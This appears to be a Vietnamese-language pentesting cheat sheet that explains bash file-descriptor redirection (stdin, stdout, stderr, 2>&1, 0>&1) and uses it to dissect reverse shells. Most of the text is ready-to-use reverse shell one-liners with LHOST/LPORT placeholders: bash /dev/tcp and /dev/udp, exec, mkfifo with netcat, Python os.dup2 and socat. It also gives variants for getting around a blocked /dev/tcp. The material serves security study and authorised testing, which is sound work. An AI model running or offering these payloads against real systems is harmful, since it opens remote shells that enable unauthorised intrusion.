# 🔀 File Descriptor & Redirection Cheat Sheet
> Kỹ thuật `>&`, `<&1`, `0>&1` và các biến thể — dành cho pentester

---

## 📌 Khái niệm cơ bản: File Descriptor (FD)

| FD | Tên | Mô tả |
|----|-----|-------|
| `0` | stdin | Đầu vào chuẩn (bàn phím) |
| `1` | stdout | Đầu ra chuẩn (màn hình) |
| `2` | stderr | Đầu ra lỗi (màn hình) |
| `3+` | custom | Socket, file, pipe, v.v. |

Mọi process đều có 3 FD mặc định này trỏ vào terminal. Kỹ thuật redirection là **thay đổi đích** của các FD này.

---

## 🧠 Giải phẫu lệnh kinh điển

```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
│       │   │                   └── stdin(0) = copy từ fd1 (socket)
│       │   └── /dev/tcp/IP/PORT = bash mở TCP socket (fd 3)
│       └── >& = redirect stdout(1) + stderr(2) → fd đó
└── bash -i = interactive shell (giữ stdin/stdout)
```

### Luồng dữ liệu sau khi chạy:

```
[Attacker gõ lệnh]
       ↓
   TCP Socket (fd 3)
       ↓
   stdin (fd 0) ←── 0>&1 (copy fd1 vào fd0, fd1 đang là socket)
       ↓
   bash -i xử lý lệnh
       ↓
   stdout (fd 1) ──→ TCP Socket (fd 3) ──→ [Attacker thấy output]
   stderr (fd 2) ──┘  (vì >& redirect cả 2)
```

---

## 🔧 Các toán tử Redirection

### Redirect cơ bản

```bash
>           # stdout → file (ghi đè)
>>          # stdout → file (thêm vào)
<           # stdin ← file
2>          # stderr → file
2>>         # stderr → file (thêm vào)
```

### Redirect nâng cao

```bash
>&          # stdout + stderr → fd/file  (bash shorthand), Redirect cả stdout (1) và stderr (2) vào cùng một file 
&>          # stdout + stderr → file     (bash 4+, tương đương), Dùng để duplicate file descriptor (chuyển hướng luồng này sang luồng kia)
2>&1        # stderr → stdout (đích mà stdout đang trỏ)
1>&2        # stdout → stderr
0>&1        # stdin  → stdout (đích mà stdout đang trỏ)
<&1         # stdin  ← stdout (đọc từ stdout — dùng trong pipe)
```

### Duplicate FD (>&N, <&N)

```bash
# Cú pháp: [fd_đích]>&[fd_nguồn]
# Nghĩa: "fd_đích bây giờ trỏ đến cùng nơi fd_nguồn đang trỏ"

2>&1        # stderr trỏ vào nơi stdout đang trỏ
0>&1        # stdin  trỏ vào nơi stdout đang trỏ → có thể đọc từ socket!
1>&2        # stdout trỏ vào nơi stderr đang trỏ
```

> ⚠️ **Thứ tự quan trọng!**
> - `cmd > file 2>&1` → stdout → file, rồi stderr → file (ĐÚNG)
> - `cmd 2>&1 > file` → stderr → terminal (cũ), stdout → file (SAI)

---

## 🐚 Các biến thể Reverse Shell với giải thích

### Variant 1: Classic (dùng >& và 0>&1)

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

- `>& fd` = redirect fd1 + fd2 → socket
- `0>&1` = stdin đọc từ socket (vì fd1 = socket rồi)

### Variant 2: Dùng exec (stealth hơn)

```bash
exec bash -i &>/dev/tcp/LHOST/LPORT <&1
```

- `exec` = replace process hiện tại (không fork)
- `&>` = stdout+stderr → socket
- `<&1` = stdin ← fd1 (socket)

### Variant 3: Tường minh hơn (dễ hiểu)

```bash
bash -i > /dev/tcp/LHOST/LPORT 2>&1 0>&1
```

- `>` redirect stdout → socket (fd1 = socket)
- `2>&1` redirect stderr → nơi fd1 đang trỏ (socket)
- `0>&1` redirect stdin ← nơi fd1 đang trỏ (socket)

### Variant 4: Qua /dev/udp

```bash
bash -i >& /dev/udp/LHOST/LPORT 0>&1
```

- Dùng UDP thay TCP — bypass một số firewall rule

### Variant 5: Dùng mkfifo (không cần /dev/tcp)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST LPORT > /tmp/f
```

Giải thích từng bước:
```
mkfifo /tmp/f           # Tạo named pipe (FIFO)
cat /tmp/f              # Đọc từ pipe → pipe vào stdin của bash
| /bin/bash -i 2>&1     # bash chạy lệnh, stderr merge vào stdout
| nc LHOST LPORT        # Output → nc (gửi cho attacker)
> /tmp/f                # nc nhận lệnh từ attacker → ghi vào pipe
                        # ↑ vòng tròn hoàn chỉnh!
```

### Variant 6: Python (dùng os.dup2)

```python
import socket, subprocess, os
s = socket.socket()
s.connect(("LHOST", LPORT))
# Duplicate socket fd vào 0, 1, 2
os.dup2(s.fileno(), 0)   # stdin  ← socket
os.dup2(s.fileno(), 1)   # stdout → socket
os.dup2(s.fileno(), 2)   # stderr → socket
subprocess.call(["/bin/bash", "-i"])
```

`os.dup2(old_fd, new_fd)` = Python tương đương của `2>&1` trong shell.

---

## 📂 /dev/tcp — Bash Magic

`/dev/tcp/HOST/PORT` **không phải file thật** — đây là bash built-in:

```bash
# Kiểm tra bash có hỗ trợ không
bash -c 'echo test > /dev/tcp/127.0.0.1/9999'

# Đọc từ TCP port
exec 3<>/dev/tcp/google.com/80
echo "GET / HTTP/1.0" >&3
cat <&3

# Kiểm tra port mở (thay netcat)
(echo >/dev/tcp/HOST/PORT) 2>/dev/null && echo "OPEN"
```

> ❌ `/dev/tcp` **không hoạt động** trong: sh, dash, zsh, fish  
> ✅ Chỉ hoạt động trong **bash**

---

## 🔄 exec — Redirect toàn bộ session

```bash
# Redirect tất cả I/O của shell hiện tại
exec > /tmp/output.log 2>&1        # Mọi output → file
exec < /tmp/input.txt               # Mọi input ← file

# Redirect cho reverse shell không cần subshell
exec 5<>/dev/tcp/LHOST/LPORT
cat <&5 | while read line; do $line 2>&5 >&5; done

# Mở FD tùy chỉnh
exec 3<>/dev/tcp/LHOST/LPORT       # Mở fd 3 = socket
echo "hello" >&3                    # Gửi qua socket
read -u 3 response                  # Đọc từ socket
exec 3>&-                           # Đóng fd 3
```

---

## 🚫 Bypass khi /dev/tcp bị chặn

### Dùng bash với fd khác

```bash
# Mở connection qua fd tùy chỉnh
bash -c 'exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196'
```

### Dùng Socat (full duplex)

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:LHOST:LPORT
```

### Dùng /proc/self/fd (nếu /dev không mount)

```bash
# Xem các FD đang mở
ls -la /proc/self/fd/

# Redirect qua symlink trong /proc
bash -i >& /proc/self/fd/3 0>&1
```

---

## 🧪 Debug & Kiểm tra Redirection

```bash
# Xem FD của process đang chạy
ls -la /proc/PID/fd/

# Strace redirect
strace -e trace=read,write,open,dup2 bash -c 'ls 2>&1'

# Bash -x để debug
bash -x -c 'ls >& /dev/tcp/127.0.0.1/9999 0>&1'

# Test nhanh bằng nc local
# Terminal 1:
nc -lvnp 4444
# Terminal 2:
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

---

## 📊 Bảng tóm tắt

| Cú pháp | Đọc là | Tác dụng |
|---------|--------|----------|
| `>file` | stdout vào file | Ghi đè stdout |
| `>>file` | stdout append file | Thêm vào stdout |
| `2>&1` | stderr vào stdout | Merge stderr → stdout |
| `>&file` | stdout+stderr vào file | Ghi cả hai |
| `0>&1` | stdin từ stdout | Đọc input từ socket |
| `<&1` | stdin từ fd1 | Tương tự 0>&1 |
| `exec N<>file` | Mở fd N đọc/ghi | Bidirectional fd |
| `>&-` | Đóng stdout | Close fd |
| `3>&-` | Đóng fd 3 | Close custom fd |

---

## 💡 Tips & Gotchas

```bash
# SAIIII: 2>&1 trước > file
command 2>&1 > file       # stderr → terminal, stdout → file

# ĐÚNG: > file trước 2>&1
command > file 2>&1       # cả hai → file

# Check shell nào đang dùng
readlink /proc/$$/exe
echo $0

# bash -i vs bash
# -i = interactive: load ~/.bashrc, giữ stdin, in prompt
# không có -i: non-interactive, shell tắt ngay khi stdin EOF

# /dev/tcp chỉ trong bash — test nhanh:
[ -d /dev/tcp ] && echo "maybe" || bash -c 'echo x>/dev/tcp/127.0.0.1/1 2>/dev/null; echo $?'
```

---

## 🔗 Tài nguyên

| Nguồn | Link |
|-------|------|
| Bash manual — Redirections | `man bash` → /Redirections |
| RevShells Generator | https://www.revshells.com |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md |

---

> ⚠️ Chỉ sử dụng cho mục đích học tập, CTF và pentest được ủy quyền.